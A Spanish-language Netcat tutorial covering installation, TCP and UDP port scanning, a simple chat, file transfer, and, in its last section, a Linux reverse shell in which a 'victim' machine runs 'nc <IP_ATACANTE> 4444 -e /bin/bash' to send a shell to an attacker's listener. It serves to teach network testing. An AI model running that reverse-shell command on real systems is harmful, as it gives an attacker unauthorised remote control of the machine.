# **Gua de Netcat** 
Netcat (nc) es una herramienta poderosa que permite escanear puertos, transferir archivos, chatear y establecer shells remotas.

1. Qu es Netcat?

Netcat es una herramienta de red que permite leer y escribir datos en conexiones a travs de TCP y UDP. Se usa para depuracin de redes, pruebas de seguridad y automatizacin de tareas.


*   **Instalacin:**

>
    sudo apt update && sudo apt install netcat -y


2. Escaneo de Puertos (Port Scanning)

Netcat puede usarse como un escner de puertos bsico.


*   TCP

>
      nc -zv <IP> <PUERTO_INICIAL>-<PUERTO_FINAL>

      ejemplo:

      nc -zv 192.168.1.1 20-100

    -z: No enva datos, solo verifica si los puertos estn abiertos.
    -v: Modo verbose (muestra informacin detallada)

*   UDP

>

      nc -zvu <IP> <PUERTO>

      ejemplo:

      nc -zvu 192.168.1.1 53

    -z: No enva datos, solo verifica si los puertos estn abiertos.
    -v: Modo verbose (muestra informacin detallada)
    -u: Fuerza el uso de UDP.




3. Chat con Netcat

Podemos establecer una comunicacin interactiva entre dos mquinas.

 Paso 1 (Servidor) - Escuchar conexiones en un puerto
>
    nc -nlvp 4444
    
    -l: Escucha conexiones entrantes
    -v: Muestra informacin detallada
    -p: Especifica un puerto de origen
    -n: Evita la resolucin DNS (ms rpido y discreto)

 Paso 2 (Cliente) - Conectar al servidor
>
    nc <IP_DEL_SERVIDOR> 4444


4. Transferencia de Archivos con Netcat

Podemos enviar archivos de una mquina a otra.

 Enviar archivo desde el Cliente

>
    nc <IP_DESTINO> 4444 < archivo.txt

 Recibir archivo en el Servidor

>
    nc -nlvp 4444 > archivo.txt

 Esto transfiere archivo.txt de un equipo a otro sin autenticacin.


5. Reverse Shell en Linux

Qu es una Reverse Shell?

Una reverse shell permite que una mquina vctima se conecte a un atacante y le proporcione acceso remoto.


 Paso 1 (Atacante - Escuchar conexin en su mquina)
>
    nc -nlvp 4444

 Paso 2 (Vctima - Enviar una shell al atacante)
>
    nc <IP_ATACANTE> <PUERTO> -e /bin/bash

    ejemplo:

    nc 192.168.1.100 4444 -e /bin/bash

 Esto enviar una shell directamente al atacante.
